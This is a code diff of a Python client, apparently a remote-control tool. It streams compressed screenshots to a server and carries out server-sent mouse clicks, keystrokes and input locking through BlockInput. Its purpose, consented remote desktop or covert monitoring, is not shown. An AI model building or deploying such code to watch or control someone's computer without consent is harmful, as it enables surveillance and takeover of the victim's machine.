@@ -2,14 +2,15 @@ import mss
 import mss.tools
 import requests
 from time import sleep
-from zlib import compress
 from sys import exit
 import psutil
 import threading
 import sqlite3
 from shutil import copyfile
+from io import BytesIO
 from getmac import get_mac_address
 import getpass
+from PIL import Image
 import socket
 import json
 import win32api, win32con
@@ -51,23 +52,22 @@ class ScreenShot:
 
         Sending the screenshots to the server as long as the picture actually changes
         """
-        first_occu = 0
         prev_img = ""
         with mss.mss() as sct:
             while True:
-                first_occu = first_occu + 1
                 # Use the 1st monitor
                 sct.compression_level = 1
                 monitor = sct.monitors[1]
                 # Grab the picture
                 im = sct.grab(monitor)
-                if first_occu == 1:
-                    prev_img = im
-                # Get the entire PNG raw bytes
-                raw_bytes = mss.tools.to_png(im.rgb, im.size, level=7)
-                if raw_bytes != prev_img:
-                    self.send_screenshot(computer_id, raw_bytes)
-                prev_img = raw_bytes
+                img_obj = Image.frombytes("RGB", im.size, im.bgra, "raw", "BGRX") # Create a PIL image object.
+                bytes_stream = BytesIO()
+                img_obj.save(bytes_stream, "jpeg", quality=15)
+                bytes_stream.seek(0)
+                compressed_img = bytes_stream.read()
+                if compressed_img != prev_img:
+                    self.send_screenshot(computer_id, compressed_img)
+                prev_img = compressed_img
     
     def send_screenshot(self, computer_id, raw_bytes):
         requests.post(SERVER_URL + '/get_file/' + computer_id, data=raw_bytes,
@@ -157,11 +157,15 @@ class ComputerAction:
                 pos_y = int(float(pos[1]))
                 self.click(pos_x, pos_y)
             except:
-                lock_or_not = server_command.decode()
-                if lock_or_not == "Lock": # only works if the client is activated in administrator mode
-                    windll.user32.BlockInput(True)
+                lock_key = server_command.decode()
+                if lock_key == "Lock" or lock_key == "Unlock":
+                    if lock_key == "Lock": # only works if the client is activated in administrator mode
+                        windll.user32.BlockInput(True)
+                    else:
+                        windll.user32.BlockInput(False)
                 else:
-                    windll.user32.BlockInput(False)
+                    win32api.keybd_event(int(lock_key),0,0,0)
+                    win32api.keybd_event (int(lock_key),0, win32con.KEYEVENTF_KEYUP, 0) # key is released
 
 
 class InitServer():
